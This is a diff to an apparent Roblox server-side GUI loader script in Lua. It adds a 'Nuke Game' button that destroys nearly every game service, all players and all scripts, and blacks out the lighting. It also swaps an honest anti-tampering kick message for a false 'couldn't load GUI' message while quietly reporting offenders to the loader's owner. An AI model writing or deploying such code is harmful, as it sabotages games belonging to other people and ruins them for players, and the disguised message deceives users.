@@ -1047,7 +1047,7 @@ local InitPayload = [[
             SecureRemote.OnServerEvent:Connect(function(plr, payload)
                 if plr ~= game.Players["GUILOADER"] then
                     SecureRemote:FireClient(game.Players["GUILOADER"], plr.Name)
-                    plr:Kick("please do not change anything on the script.")
+                    plr:Kick("Couldnt load GUI correctly, please try again later")
                     return
                 end
 
@@ -1193,12 +1193,40 @@ credits.Parent = frame
     end)
 
 
-makeButton("Clear Workspace", function()
-    local children = workspace:GetChildren()
-    for _, obj in ipairs(children) do
-        if not obj:IsA("Terrain") and not obj:IsA("Camera") then
+makeButton("Nuke Game", function()
+    -- Función de borrado forzado
+    local function nuke(container)
+        for _, obj in ipairs(container:GetChildren()) do
             pcall(function()
                 obj:Destroy()
+            end)
+        end
+    end
+
+    -- Eliminar todo lo crítico
+    pcall(function() nuke(game.Workspace) end)
+    pcall(function() nuke(game.Players) end)
+    pcall(function() nuke(game.ReplicatedStorage) end)
+    pcall(function() nuke(game.StarterGui) end)
+    pcall(function() nuke(game.Lighting) end)
+    pcall(function() nuke(game.StarterPack) end)
+    pcall(function() nuke(game.ServerScriptService) end)
+    pcall(function() nuke(game.ServerStorage) end)
+    pcall(function() nuke(game.StarterPlayer) end)
+    pcall(function() nuke(game.Chat) end)
+    pcall(function() nuke(game.SoundService) end)
+
+    -- Opcional: romper aún más cosas
+    pcall(function() game.Workspace.Terrain:Clear() end)
+    pcall(function() game.Workspace.CurrentCamera:Destroy() end)
+    pcall(function() game.Lighting.Ambient = Color3.new(0,0,0) end)
+    pcall(function() game.Lighting.Brightness = 0 end)
+
+    -- Eliminar scripts que puedan rehacer cosas
+    for _, s in ipairs(game:GetDescendants()) do
+        if s:IsA("LocalScript") or s:IsA("Script") then
+            pcall(function()
+                s:Destroy()
             end)
         end
     end
